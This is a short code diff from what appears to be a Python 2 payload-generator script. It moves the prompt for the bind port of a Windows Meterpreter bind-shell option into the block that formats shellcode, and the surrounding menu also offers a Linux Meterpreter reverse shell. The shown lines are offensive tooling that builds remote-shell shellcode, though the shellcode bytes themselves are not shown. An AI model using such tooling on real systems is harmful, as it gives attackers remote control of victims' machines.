@@ -189,10 +189,6 @@ try:
     elif menuchoice == '3':
         payloadchoice = windows_met_bind_shell
         payload = 'Windows Meterpreter Bind Shell'
-        bindport = raw_input(
-            '\n[*] Press Enter For Default Bind Port(4444)\n[*] Port> ')
-        if len(bindport) is 0:
-            bindport = 4444
     elif menuchoice == '4':
         payloadchoice = linux_x86_met_rev_shell
         payload = 'Linux x86 Meterpreter Reverse Shell '
@@ -217,6 +213,10 @@ try:
         porthex = struct.pack('>h', int(portnum))
         shellcode = payloadchoice % (iphex, porthex)
     elif menuchoice == '3':
+        bindport = raw_input(
+            '\n[*] Press Enter For Default Bind Port(4444)\n[*] Port> ')
+        if len(bindport) is 0:
+            bindport = 4444
         bindporthex = struct.pack('>h', int(bindport))
         shellcode = payloadchoice % (bindporthex)
 
